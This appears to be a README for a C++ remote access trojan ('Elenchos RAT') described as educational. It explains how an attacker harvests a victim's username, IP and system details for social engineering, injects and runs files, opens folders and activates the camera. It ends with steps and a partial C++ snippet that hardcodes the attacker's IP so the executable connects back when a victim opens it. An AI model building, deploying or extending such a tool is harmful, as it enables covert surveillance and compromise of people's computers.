# Elenchos RAT Tool C++
A custom Remote Administration Tool written in C++, developed and tested in a controlled environment for educational purposes.

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Build and use](#build-and-use)

## Overview
Elenchos RAT Tool C++ is a client-server administartion tool that allows a pontential attacker to monitor and interact with a victim. All communication is handled over a basic network socket.

This RAT Tool demonstrates:
- Network socket programming in C++
- File encryption
- Cross-platform C++ development
- Client/Server communication

## Features
### Message Display
Simplex messaging from server to victim, although the victim does send the message they received from the server for attacker confirmation on what the victim is receiving. Exetremely useful for social engineering related scenarios.

### File Transfer
Send encrypted files from the server to the victim using a basic encryption Caesar Cipher Shift algorithm. Allows for an Attacker to inject files into a victim's computer, the files are always saved in the same place the .exe file is saved to.

### Extract Victim Computer Information
Request Victim's information, which includes:
- Victim's IP
- Victim's Computer Name
- Victim's Computer Username
- Victim's Operating System
- Victim's Computer Architecture
- Victim's Number of Processors
- Victim's Total and Avaliable RAM

Victim's Computer Username is exetremely useful as most people set their computer username to their name, meaning you can directly refer to them in social engineering attacks. Furthermore, when you attempt to open folders with private information you must know the Victim's Computer Username: "C:\Users\Username\Downloads\...\

### Exectue Commands
#### 1. Open a folder
Allows an Attacker to open a folder by typing in the file path, for example: "C:\Users\"

#### 2. Execute a File
All attempted executions are defaulted to the same path as where the victim's .exe is saved. So when executing a file all you have to do is type the file name, which should be done after you inject the file. 
For example:
1. Use File transfer to inject test.txt which is saved to the same path .exe is saved to
2. Choose Execute commands
3. Choose Execute a file
4. Type the file name you injected to open it on the victim's computer

#### 3. Open camera
Send a shell command to open the camera

### Play sounds
Play sounds remotely by sending an encrypted mp3 file with the same Caesar Cipher Shift algorithm.

## Build and Use
In order to use this, you must have both a linux machine representing a server, and a windows machine representing a victim. You must start the server prior to starting the client. 
1. Clone the repository:
<br>``git clone git@github.com:exercsie/Custom-Remote-Administration-Tool.git``

2. cd into it
<br>``cd Custom-Remote-Administration-Tool``

3. Type ./kServer for the server and ./victim IP for the client
<br>``./kServer`` ``./victim 127.0.0.1``

**Important** If you want the .exe to connect when a victim opens the file
you must do the following:
1. Copy and paste the code below and replace it in windowsVictim.cpp
2. Replace "TYPE IP HERE" with your linux's IP
3. Then CTRL + S (save)
4. Type make client in the console (Make sure you are in /Custom-Remote-Administration-Tool/ folder)
5. Start the server ``./kServer``
6. Open the .exe on the victim machine
```
int main(/*int argc, char* argv[]*/) {
    /*if(argc < 2) {
        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
        return 1;
    }*/
    WSADATA wsa;

    int WSASuccess;
    WSASuccess = WSAStartup(MAKEWORD(2, 2), &wsa);
    if(WSASuccess != 0) {
        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
    } else {
        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
    }

    int sock;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        std::cout << ERROR_PREFIX << " Socket failed\n";
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    //std::string serverip = argv[1];

    int ip;
    ip = inet_pton(AF_INET, /*serverip.c_str()*/ "TYPE IP HERE", &serverAddress.sin_addr); 
    if(ip < 1) {
        std::cout << ERROR_PREFIX << " Invalid IP address\n";
        return 1;
    }
```

